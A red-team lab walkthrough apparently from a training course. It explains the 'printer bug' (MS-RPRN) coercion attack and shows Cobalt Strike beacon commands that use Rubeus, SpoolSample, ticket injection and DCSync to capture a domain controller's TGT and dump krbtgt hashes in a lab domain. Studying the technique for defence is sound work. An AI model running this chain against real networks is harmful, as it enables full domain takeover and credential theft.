At DerbyCon 2018 Will Schroeder, Lee Christensen and Matt Nelson gave a presentation called "The Unintended Risks of Trusting Active Directory". Within that talk, they demonstrated how an adversary can coerce any machine in a forest to authenticate to another machine in the forest, via a means they dubbed "the printer bug".

The MS-RPRN Print System Remote Protocol (hence the cute name) defines the communications for print job processing and print system management between a print client and a print server. Lee used **RpcRemoteFindFirstPrinterChangeNotificationEx()**, to set up a change notification between a print server (_Machine A_) and a print client (_Machine B_). This caused _Machine A_ to authenticate to _Machine B_.

If _Machine B_ is configured with unconstrained delegation, this would allow us to capture the TGT of _Machine A_. With a TGT for _Machine A_, we can craft service tickets to access any service on _Machine A_ as a local administrator. And of course if _Machine A_ is a domain controller, we will gain Domain Admin level privilege.

Furthermore, this RPC service is accessible by all domain users, is enabled by default since Windows 8 and won't be fixed by Microsoft since it's "by design".

The proof-of-concept code is [here](https://github.com/leechristensen/SpoolSample).

On SRV-1:

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe monitor /targetuser:DC-2$ /interval:10 /nowrap

[*] Action: TGT Monitoring
[*] Target user     : DC-2$
[*] Monitoring every 10 seconds for new TGTs
```
  

On WKSTN-1:

```
beacon> execute-assembly C:\Tools\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe dc-2 srv-1

[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
```
Where:

-   `dc-2` is the "target" server
-   `srv-1` is the "capture" server
  

```
[*] 3/9/2021 12:00:07 PM UTC - Found new TGT:

  User                  :  DC-2$@DEV.CYBERBOTIC.IO
  StartTime             :  3/9/2021 10:27:15 AM
  EndTime               :  3/9/2021 8:27:13 PM
  RenewTill             :  1/1/1970 12:00:00 AM
  Flags                 :  name_canonicalize, pre_authent, forwarded, forwardable
  Base64EncodedTicket   :

    doIFLz [...snip...] MuSU8=

[*] Ticket cache size: 1
```

```
beacon> make_token DEV\DC-2$ FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\dc-2.kirbi

beacon> dcsync dev.cyberbotic.io DEV\krbtgt
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
[DC] 'DEV\krbtgt' will be the user account

* Primary:Kerberos-Newer-Keys *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa
      aes128_hmac       (4096) : 473a92cc46d09d3f9984157f7dbc7822
      des_cbc_md5       (4096) : b9fefed6da865732
```

